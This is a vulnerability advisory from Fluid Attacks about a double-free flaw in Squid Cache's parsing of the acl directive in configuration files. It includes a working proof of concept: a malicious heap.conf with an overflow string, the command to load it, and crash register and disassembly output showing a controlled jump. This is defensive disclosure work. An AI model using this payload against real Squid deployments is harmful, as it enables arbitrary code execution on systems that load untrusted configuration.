---
slug: advisories/morrison/
title: Squid Cache vulnerability
authors: Andres Roldan
writer: aroldan
codename: morrison
product: Squid Cache
date: 2021-02-16 14:00 COT
cveid: Pending
description: Squid Cache vulnerability
keywords: Fluid Attacks, Security, Vulnerabilities, Squid
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|               |                                                        |
|---------------|--------------------------------------------------------|
| **Name**      | Squid Cache vulnerability                              |
| **Code name** | [Morrison](https://en.wikipedia.org/wiki/Van_Morrison) |
| **Product**   | Squid Cache                                            |
| **State**     | Published                                              |

## Vulnerability

|                       |                                                                                                   |
|-----------------------|---------------------------------------------------------------------------------------------------|
| **Kind**              | Double-Free/Arbitrary code execution                                                              |
| **Rule**              | [345. Establish protections against overflows](https://docs.fluidattacks.com/criteria/source/345) |
| **Remote**            | No                                                                                                |
| **CVSSv3 Vector**     | CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H                                                      |
| **CVSSv3 Base Score** | 6.4 MEDIUM                                                                                        |
| **Exploit available** | Yes                                                                                               |

## Description

A Double-Free bug was found in Squid versions up to 4.14 and 5.0.5 when
processing the `acl` directive on configuration files, more specifically
the first and second addresses.

This may allow arbitrary code execution on a Squid deployment on where
the configuration files may be processed from untrusted sources.

## Proof of Concept

Create a file with the following contents:

<div class="formalpara-title">

**heap.conf**

</div>

``` config
acl localnet src
1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA92.168.0.0/16
```

Run `squid` as:

``` shell
/usr/sbin/squid -f heap.conf
```

These are the values of the CPU registers at the moment of the crash

``` bash
$rax   : 0x4141414141414141 ("AAAAAAAA"?)
$rbx   : 0x0000555555c77f60  →  0x0000000900000009
$rcx   : 0x0000555555dcd010  →  0x0003000200010004
$rdx   : 0x39
$rsp   : 0x00007fffffffe3c8  →  0x00005555558c4f93  →
 <acl_ip_data::FactoryParse(char+0> call 0x555555709d10 <_Z13self_destructv>
$rbp   : 0x0000555555e18da0  →
 "1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rsi   : 0x0000555555e15e80  →  0x0000000000000000
$rdi   : 0x4141414141414141 ("AAAAAAAA"?)
$rip   : 0x0000555555af55e0  →  <Mem::AllocatorProxy::freeOne(void*)+16>
mov rax, QWORD PTR [rax]
$r8    : 0x0
$r9    : 0x3b4
$r10   : 0x0000555555e19120  →  0x0000000000000000
$r11   : 0x246
$r12   : 0x0
$r13   : 0x0000555555d67aa0  →
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r14   : 0x0000555555e0a220  →  0x0000555555c49f98  →  0x00007ffff787ef20
 →  <std::__cxx11::basic_ostringstream<char,+0> mov rax, QWORD PTR
[rip+0x9e619]        # 0x7ffff791d540
$r15   : 0x00007fffffffe450  →  0x0000555555b37e3e  →  "FactoryParse"
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow
RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
```

And the execution stops at:

``` bash
   0x555555af55d9 <Mem::AllocatorProxy::freeOne(void*)+9> mov    rsi, rbp
   0x555555af55dc <Mem::AllocatorProxy::freeOne(void*)+12> pop    rbp
   0x555555af55dd <Mem::AllocatorProxy::freeOne(void*)+13> mov    rdi, rax
 → 0x555555af55e0 <Mem::AllocatorProxy::freeOne(void*)+16> mov    rax,QWORD PTR [rax]
   0x555555af55e3 <Mem::AllocatorProxy::freeOne(void*)+19> mov    rax,QWORD PTR [rax+0x28]
   0x555555af55e7 <Mem::AllocatorProxy::freeOne(void*)+23> jmp    rax
   0x555555af55e9                  nop
   0x555555af55ea                  nop    WORD PTR [rax+rax*1+0x0]
   0x555555af55f0 <Mem::AllocatorProxy::inUseCount()+0> mov    rdi, QWORD
PTR [rdi+0x10]
```

As the value of `RAX` is populated using the malicious input
configuration, arbitrary command execution is achieved at
`0x555555af55e7`.

## Mitigation

By 2021-03-17 there is not a patch resolving the issue.

## Credits

The vulnerability was discovered by [Andrés
Roldán](https://www.linkedin.com/in/andres-roldan/) from the Offensive
Team of `Fluid Attacks`.

## Timeline

- 2021-02-08: Vulnerability discovered.

- 2021-02-09: Vendor contacted.

- 2021-02-10: Vendor replied asking to test for the vulnerability once
  the patch is available.

- 2021-02-22: Vendor contacted again to check for updates.

- 2021-02-22: Vendor replied that, although this bug is not worth
  hiding because of the nature of the exploitation environment.

- 2021-02-24: Public disclosure

## References

|                                  |                                                   |
|----------------------------------|---------------------------------------------------|
| **Vendor page**                  | <http://www.squid-cache.org/>                     |
| **Full Disclosure announcement** | <https://seclists.org/fulldisclosure/2021/Feb/80> |
